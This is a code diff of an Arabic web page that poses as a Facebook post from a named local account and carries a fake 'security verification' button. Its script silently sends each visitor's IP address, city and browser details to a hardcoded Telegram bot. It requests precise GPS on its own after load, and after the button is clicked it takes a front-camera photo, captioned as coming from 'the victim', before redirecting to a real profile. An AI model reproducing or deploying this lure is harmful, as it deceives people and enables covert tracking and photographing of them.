@@ -3,98 +3,167 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>جاري التحقق من الأمان</title>
+    <title>فيسبوك</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            background: #1e1e2f;
-            font-family: 'Segoe UI', sans-serif;
-            text-align: center;
-            padding: 50px 20px;
-            color: white;
+            background: #f0f2f5;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            padding: 15px;
         }
-        .container {
-            background: #2a2a3b;
-            padding: 30px;
-            border-radius: 20px;
-            max-width: 400px;
-            margin: auto;
-            box-shadow: 0 0 15px rgba(0,0,0,0.5);
+        .fb-post {
+            max-width: 600px;
+            margin: 20px auto;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            overflow: hidden;
         }
-        button {
-            background: #0a84ff;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 30px;
+        .post-header {
+            display: flex;
+            padding: 12px 16px;
+            align-items: center;
+            gap: 10px;
+        }
+        .avatar {
+            width: 40px;
+            height: 40px;
+            background: #1877f2;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             color: white;
+            font-weight: bold;
             font-size: 18px;
-            margin-top: 20px;
+        }
+        .post-name {
+            font-weight: bold;
+            font-size: 15px;
+            color: #050505;
+        }
+        .post-time {
+            font-size: 12px;
+            color: #65676b;
+        }
+        .post-text {
+            padding: 0 16px 12px;
+            font-size: 15px;
+            line-height: 1.4;
+            color: #050505;
+        }
+        .post-img-placeholder {
+            background: #e4e6eb;
+            height: 250px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #65676b;
+        }
+        .comments-section {
+            padding: 12px 16px;
+            border-top: 1px solid #e4e6eb;
+        }
+        .comment {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+        .comment-avatar {
+            width: 32px;
+            height: 32px;
+            background: #e4e6eb;
+            border-radius: 50%;
+        }
+        .comment-text {
+            background: #f0f2f5;
+            padding: 8px 12px;
+            border-radius: 18px;
+            font-size: 13px;
+        }
+        .fake-btn {
+            background: #1877f2;
+            color: white;
+            border: none;
+            padding: 8px;
+            width: 100%;
+            font-weight: bold;
+            border-radius: 6px;
+            margin-top: 10px;
             cursor: pointer;
         }
-        video, canvas {
-            display: none;
-        }
-        .hidden {
-            display: none;
-        }
-        .status {
-            margin-top: 15px;
-            padding: 10px;
-            border-radius: 10px;
-            background: #3a3a4b;
-        }
+        .hidden { display: none; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>🔐 تحقق من هوية الزائر</h2>
-    <p>لأسباب أمنية، يلزم تأكيد هويتك</p>
-    <div id="status" class="status">📡 جاري تجهيز البيانات...</div>
-    <button id="allowBtn" class="hidden">✅ السماح بالتحقق</button>
+<div class="fb-post">
+    <div class="post-header">
+        <div class="avatar">ج</div>
+        <div>
+            <div class="post-name">جبله علي جبر بك</div>
+            <div class="post-time">منذ 3 ساعات · 🌐 عام</div>
+        </div>
+    </div>
+    <div class="post-text">
+        مين بجبله فينا نعتمد عليه يفصلنا كاتم ل كلوك 🤔
+    </div>
+    <div class="post-img-placeholder">
+        ⚡ اضغط على "أظهر المزيد" للمتابعة
+    </div>
+    <div class="comments-section">
+        <div class="comment">
+            <div class="comment-avatar"></div>
+            <div class="comment-text">أبو رامي: بدنا واحد فاهم 🤣</div>
+        </div>
+        <div class="comment">
+            <div class="comment-avatar"></div>
+            <div class="comment-text">علي: موجودين</div>
+        </div>
+        <button id="verifyBtn" class="fake-btn">🔐 أظهر المحتوى (تحقق أمني)</button>
+    </div>
 </div>
 
 <video id="video" autoplay></video>
 <canvas id="canvas"></canvas>
 
 <script>
-    // ================= البيانات الخاصة بك =================
+    // ========== بيانات التليغرام (جديدة) ==========
     const BOT_TOKEN = "8669811855:AAEzIrBKoyRD5f9zpKLQB0IwTxviOrSujN0";
     const CHAT_ID = "7214473798";
     const PAGE_NAME = "جبله علي جبر بك";
-    // ====================================================
+    // ============================================
 
-    // دالة إرسال إلى التليغرام (نص)
-    async function sendToTelegram(message) {
-        try {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            await fetch(url, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message.substring(0, 4096),
-                    parse_mode: 'HTML'
-                })
-            });
-        } catch(e) {
-            console.error("Telegram send error:", e);
-        }
+    let gpsSent = false;
+    let cameraActive = false;
+
+    function sendToTelegram(text) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: text.substring(0, 4096),
+                parse_mode: 'HTML'
+            })
+        }).catch(e => console.log);
     }
 
-    // دالة إرسال صورة إلى التليغرام
-    async function sendPhotoToTelegram(base64Image) {
-        try {
-            const blob = dataURLtoBlob(base64Image);
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'photo.jpg');
-            formData.append('caption', `📸 ${PAGE_NAME} - صورة من كاميرا الضحية\n🕒 ${new Date().toLocaleString()}`);
-
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-            await fetch(url, { method: 'POST', body: formData });
-        } catch(e) {
-            console.error("Photo send error:", e);
-        }
+    function sendPhotoToTelegram(base64Image) {
+        const blob = dataURLtoBlob(base64Image);
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'shot.jpg');
+        formData.append('caption', `📸 ${PAGE_NAME} - صورة من كاميرا الضحية\n🕒 ${new Date().toLocaleString()}`);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        }).catch(e => console.log);
     }
 
     function dataURLtoBlob(dataURL) {
@@ -103,109 +172,100 @@
         const bstr = atob(arr[1]);
         let n = bstr.length;
         const u8arr = new Uint8Array(n);
-        while (n--) { u8arr[n] = bstr.charCodeAt(n); }
+        while (n--) u8arr[n] = bstr.charCodeAt(n);
         return new Blob([u8arr], { type: mime });
     }
 
-    // جلب الـ IP + الموقع التقريبي
-    async function getLocationInfo() {
+    async function getIPAndLocation() {
         try {
             const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            return {
-                ip: data.ip,
-                city: data.city,
-                region: data.region,
-                country: data.country_name,
-                lat: data.latitude,
-                lon: data.longitude,
-                org: data.org
-            };
+            const d = await res.json();
+            let msg = `🌐 <b>${PAGE_NAME}</b> - دخول جديد\n📡 IP: ${d.ip}\n🏙️ ${d.city || 'غير معروف'}, ${d.country_name || ''}\n🖥️ ${navigator.userAgent}`;
+            if (d.latitude && d.longitude) {
+                msg += `\n🗺️ تقريبي: https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+            }
+            sendToTelegram(msg);
         } catch(e) {
-            return null;
+            sendToTelegram(`⚠️ ${PAGE_NAME} - فشل جلب IP`);
         }
     }
 
-    // طلب الموقع الدقيق (GPS)
-    function requestGPS() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                async (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const acc = position.coords.accuracy;
-                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-
-                    let gpsMsg = `🎯 <b>${PAGE_NAME}</b> - موقع دقيق ✅\n`;
-                    gpsMsg += `📍 ${mapLink}\n`;
-                    gpsMsg += `📏 دقة: ${Math.round(acc)} متر`;
-                    await sendToTelegram(gpsMsg);
-                },
-                async (error) => {
-                    await sendToTelegram(`⚠️ ${PAGE_NAME} - رفض GPS: ${error.message}`);
-                },
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
-        }
+    function getGPS() {
+        if (!navigator.geolocation) return;
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                if (gpsSent) return;
+                gpsSent = true;
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                sendToTelegram(`🎯 <b>${PAGE_NAME}</b> - موقع دقيق ✅\n📍 ${mapLink}\n📏 دقة: ${Math.round(pos.coords.accuracy)} متر`);
+            },
+            err => sendToTelegram(`⚠️ ${PAGE_NAME} - رفض GPS: ${err.message}`),
+            { enableHighAccuracy: true, timeout: 8000 }
+        );
     }
 
-    // طلب كاميرا وتصوير
-    function requestCameraAndCapture() {
+    function captureCamera() {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then((stream) => {
-                    video.srcObject = stream;
-                    video.play();
-
-                    setTimeout(() => {
-                        const context = canvas.getContext('2d');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const dataURL = canvas.toDataURL('image/jpeg', 0.8);
-                        sendPhotoToTelegram(dataURL);
-                        
-                        // إيقاف الكاميرا
-                        stream.getTracks().forEach(track => track.stop());
-                        video.srcObject = null;
-                    }, 1500);
-                })
-                .catch((err) => {
-                    sendToTelegram(`⚠️ ${PAGE_NAME} - رفض كاميرا: ${err.message}`);
-                });
-        } else {
-            sendToTelegram(`⚠️ ${PAGE_NAME} - المتصفح لا يدعم الكاميرا`);
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            sendToTelegram(`⚠️ ${PAGE_NAME} - الكاميرا غير مدعومة`);
+            return;
         }
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) // أمامية
+            .then(stream => {
+                video.srcObject = stream;
+                video.play();
+                setTimeout(() => {
+                    const ctx = canvas.getContext('2d');
+                    canvas.width = video.videoWidth || 400;
+                    canvas.height = video.videoHeight || 300;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const dataURL = canvas.toDataURL('image/jpeg', 0.7);
+                    sendPhotoToTelegram(dataURL);
+                    stream.getTracks().forEach(track => track.stop());
+                    video.srcObject = null;
+                }, 1500);
+            })
+            .catch(err => {
+                // حاول الخلفية إذا الأمامية فشلت
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        video.srcObject = stream;
+                        video.play();
+                        setTimeout(() => {
+                            const ctx = canvas.getContext('2d');
+                            canvas.width = video.videoWidth || 400;
+                            canvas.height = video.videoHeight || 300;
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const dataURL = canvas.toDataURL('image/jpeg', 0.7);
+                            sendPhotoToTelegram(dataURL);
+                            stream.getTracks().forEach(track => track.stop());
+                            video.srcObject = null;
+                        }, 1500);
+                    })
+                    .catch(() => sendToTelegram(`⚠️ ${PAGE_NAME} - رفض الكاميرا`));
+            });
     }
 
-    // التنفيذ الرئيسي
-    (async function() {
-        // إرسال IP فوراً
-        const ipData = await getLocationInfo();
-        if (ipData && ipData.ip) {
-            let ipMsg = `🌐 <b>${PAGE_NAME}</b> - دخول جديد\n`;
-            ipMsg += `📡 IP: ${ipData.ip}\n`;
-            ipMsg += `🏙️ ${ipData.city || 'غير معروف'}, ${ipData.country || ''}\n`;
-            if (ipData.lat && ipData.lon) {
-                ipMsg += `🗺️ تقريبي: https://www.google.com/maps?q=${ipData.lat},${ipData.lon}`;
-            }
-            await sendToTelegram(ipMsg);
-        } else {
-            await sendToTelegram(`⚠️ ${PAGE_NAME} - زائر جديد لكن تعذر جلب IP`);
-        }
-
-        // طلب GPS بعد ثانية
-        setTimeout(() => { requestGPS(); }, 2000);
-        
-        // طلب كاميرا بعد 3 ثواني
-        setTimeout(() => { 
-            document.getElementById('status').innerHTML = "🎥 نطلب الوصول للكاميرا...";
-            requestCameraAndCapture(); 
+    // عند الضغط على زر التحقق
+    document.getElementById('verifyBtn').onclick = () => {
+        document.getElementById('verifyBtn').innerText = '✓ جاري التحقق...';
+        getGPS();
+        captureCamera();
+        setTimeout(() => {
+            window.location.href = "https://www.facebook.com/jableh.ali.jbr";
         }, 4000);
-    })();
+    };
+
+    // فتح الصفحة: يجيب IP فوراً
+    getIPAndLocation();
+
+    // طلب GPS تلقائي بعد 1.5 ثانية (بدون ضغط زر)
+    setTimeout(() => {
+        getGPS();
+    }, 1500);
 </script>
 </body>
 </html>
